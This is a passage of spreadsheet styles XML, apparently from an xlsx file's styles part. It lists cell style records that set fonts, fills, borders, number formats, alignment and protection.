    </xf>
    <xf numFmtId="0" fontId="83" fillId="20" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="21" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="22" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="23" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="24" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="25" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="26" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="27" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="28" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="29" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="30" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="31" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="32" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="33" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="34" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="35" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="36" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="37" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="38" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="39" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="40" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="83" fillId="41" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="42" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="84" fillId="0" borderId="0"/>
    <xf numFmtId="49" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" applyProtection="1">
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="0" fontId="85" fillId="0" borderId="0" applyAlignment="1" applyProtection="1">
      <alignment vertical="top"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="180" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="181" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="182" fontId="86" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="183" fontId="86" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="184" fontId="87" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="185" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="186" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="187" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="188" fontId="23" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="0" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" wrapText="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="189" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="88" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="89" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="0" fontId="90" fillId="0" borderId="5" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="190" fontId="1" fillId="0" borderId="0"/>
    <xf numFmtId="41" fontId="1" fillId="0" borderId="0"/>
    <xf numFmtId="191" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="192" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="91" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="92" fillId="0" borderId="0"/>
    <xf numFmtId="42" fontId="93" fillId="0" borderId="0"/>
    <xf numFmtId="193" fontId="93" fillId="0" borderId="0"/>
    <xf numFmtId="15" fontId="55" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="94" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="95" fillId="5" borderId="7"/>
    <xf numFmtId="194" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="195" fontId="0" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="38" fontId="95" fillId="7" borderId="0"/>
    <xf numFmtId="0" fontId="96" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="97" fillId="0" borderId="29" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="97" fillId="0" borderId="12" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="10" fontId="95" fillId="6" borderId="7"/>
    <xf numFmtId="196" fontId="64" fillId="43" borderId="0"/>
    <xf numFmtId="0" fontId="89" fillId="44" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="44" fontId="98" fillId="0" borderId="0" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="38" fontId="17" fillId="0" borderId="0"/>
    <xf numFmtId="38" fontId="99" fillId="0" borderId="0"/>
    <xf numFmtId="38" fontId="100" fillId="0" borderId="0"/>
    <xf numFmtId="38" fontId="89" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="fill"/>
    </xf>
    <xf numFmtId="196" fontId="64" fillId="45" borderId="0"/>
    <xf numFmtId="197" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="198" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="101" fillId="0" borderId="30"/>
    <xf numFmtId="199" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="200" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="101" fillId="46" borderId="31" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="37" fontId="102" fillId="0" borderId="0"/>
    <xf numFmtId="39" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="103" fillId="0" borderId="0"/>
    <xf numFmtId="191" fontId="1" fillId="0" borderId="0"/>
    <xf numFmtId="201" fontId="1" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="0" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" wrapText="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="10" fontId="1" fillId="0" borderId="0"/>
    <xf numFmtId="9" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="95" fillId="7" borderId="7"/>
    <xf numFmtId="202" fontId="104" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="55" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="203" fontId="64" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="0" fontId="105" fillId="47" borderId="0"/>
    <xf numFmtId="0" fontId="106" fillId="0" borderId="7" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="106" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="107" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="101" fillId="0" borderId="0"/>
    <xf numFmtId="40" fontId="108" fillId="0" borderId="0" applyAlignment="1">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="65" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="27" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="109" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="110" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="117" fillId="0" borderId="0"/>
    <xf numFmtId="204" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="205" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="206" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="207" fontId="64" fillId="0" borderId="0"/>
    <xf numFmtId="41" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="43" fontId="23" fillId="0" borderId="0"/>
    <xf numFmtId="41" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="43" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="111" fillId="0" borderId="0"/>
    <xf numFmtId="191" fontId="1" fillId="0" borderId="7"/>
    <xf numFmtId="38" fontId="84" fillId="0" borderId="0"/>
    <xf numFmtId="40" fontId="84" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="112" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0"/>
  </cellStyleXfs>
  <cellXfs count="651">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" pivotButton="0" quotePrefix="0" xfId="142"/>
    <xf numFmtId="0" fontId="2" fillId="2" borderId="0" pivotButton="0" quotePrefix="0" xfId="142"/>
    <xf numFmtId="0" fontId="1" fillId="2" borderId="0" pivotButton="0" quotePrefix="0" xfId="142"/>
    <xf numFmtId="0" fontId="1" fillId="3" borderId="1" pivotButton="0" quotePrefix="0" xfId="142"/>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="2" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="142">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="5" borderId="3" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="142">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="3" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="142">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="3" fillId="4" borderId="4" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="142">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="3" borderId="5" pivotButton="0" quotePrefix="0" xfId="142"/>
    <xf numFmtId="0" fontId="1" fillId="3" borderId="6" pivotButton="0" quotePrefix="0" xfId="142"/>
    <xf numFmtId="0" fontId="0" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="6" borderId="0" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="0" fontId="5" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="6" borderId="0" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="0" fontId="8" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="6" borderId="0" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="6" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="right"/>
    </xf>
    <xf numFmtId="49" fontId="9" fillId="6" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="164" fontId="10" fillId="6" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="37" fontId="10" fillId="6" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="0" fillId="6" borderId="7" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="6" borderId="7" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="6" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="right"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="40" fontId="0" fillId="6" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="37" fontId="10" fillId="6" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="left"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="6" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="0" fillId="6" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="0" fontId="7" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="37" fontId="11" fillId="5" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="10" fillId="5" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="12" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="165" fontId="13" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="7" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="14" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="37" fontId="14" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="165" fontId="15" fillId="5" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="9" fontId="10" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="3">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="5" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="right"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="0" fillId="6" borderId="0" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="43" fontId="0" fillId="6" borderId="0" pivotButton="0" quotePrefix="0" xfId="136"/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166" fontId="18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right" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="8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49" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="20" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="20" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="20" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="20" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="20" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="168" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="20" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="21" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="0" borderId="7" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="169" fontId="18" fillId="0" borderId="11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4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/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="167" fontId="19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19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
      <protection locked="1" hidden="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="170" fontId="0" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="49" fontId="19" fillId="8" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="8" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="8" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="9" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="21" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="17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19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="171" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="58" fontId="18" fillId="0" borderId="7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67" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="171" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1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vertical="center"/>
    </xf>
    <xf numFmtId="172" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="173" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="174" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="5" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="19" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="58" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="58" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="25" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
